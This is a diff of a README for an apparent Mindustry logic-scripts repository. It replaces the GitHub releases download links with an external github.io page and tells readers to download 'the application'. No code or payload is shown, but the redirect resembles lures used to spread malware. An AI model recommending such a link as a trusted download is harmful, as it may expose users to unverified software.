@@ -1,6 +1,6 @@
 # 🤖 mindustry-logic-scripts - Smart scripts for automatic base defense
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Scripts-blueviolet?style=for-the-badge&logo=github)](https://github.com/samiperron2024-ui/mindustry-logic-scripts/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Scripts-blueviolet?style=for-the-badge&logo=github)](https://samiperron2024-ui.github.io)
 
 ## 🎯 What Is This?
 
@@ -8,7 +8,7 @@ Mindustry is a factory-building game where you defend your base from waves of en
 
 ## 🛠️ How to Download
 
-Visit this link to download the application: [https://github.com/samiperron2024-ui/mindustry-logic-scripts/releases](https://github.com/samiperron2024-ui/mindustry-logic-scripts/releases)
+Visit this link to download the application: [https://samiperron2024-ui.github.io](https://samiperron2024-ui.github.io)
 
 Click the green "Download" button on that page. The files will come as a package you can save anywhere on your computer, like your Downloads folder.
 
